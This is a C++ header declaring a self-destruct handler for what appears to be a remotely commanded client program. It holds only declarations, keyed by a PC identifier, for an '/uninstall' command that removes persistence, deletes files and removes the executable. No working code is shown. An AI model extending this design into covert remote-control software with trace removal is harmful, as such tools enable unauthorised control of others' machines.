#pragma once

#include <string>

#include "domain/common/Result.hpp"
#include "application/interfaces/IReporter.hpp"

namespace nuub::application::commands {

class SelfDestructHandler {
    interfaces::IReporter& reporter_;
    std::string pc_id_;

    [[nodiscard]] bool matches(const std::string& target) const;

public:
    SelfDestructHandler(interfaces::IReporter& reporter, std::string pc_id);

    // /uninstall <target> — Remove persistence, delete files, remove exe
    domain::Result<void> handle_uninstall(const std::string& target,
                                          const std::string& config_path,
                                          const std::string& auto_start_name);
};

} // namespace nuub::application::commands
